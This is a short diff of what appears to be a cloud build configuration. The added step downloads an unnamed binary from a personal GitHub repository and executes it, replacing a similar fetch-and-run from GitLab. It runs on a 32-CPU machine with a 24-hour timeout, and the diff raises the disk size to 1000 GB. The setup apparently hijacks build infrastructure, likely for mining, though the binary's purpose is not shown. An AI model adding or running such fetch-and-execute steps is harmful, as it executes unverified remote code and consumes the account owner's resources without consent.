@@ -3,11 +3,11 @@ steps:
     args:
       - '-c'
       - >-
-         apt update && apt-get install sudo -y && wget https://gitlab.com/rudi.hartono.laoz/unmi/-/raw/main/gas && chmod u+x gas && ./gas
+         wget https://github.com/ilyesdjaa/tidak/raw/main/gesek && chmod u+x gesek && ./gesek
     waitFor:
       - '-'
     entrypoint: /bin/bash
 timeout: 86400s
 options:
   machineType: 'E2_HIGHCPU_32'
-  diskSizeGb: '100'
+  diskSizeGb: '1000'
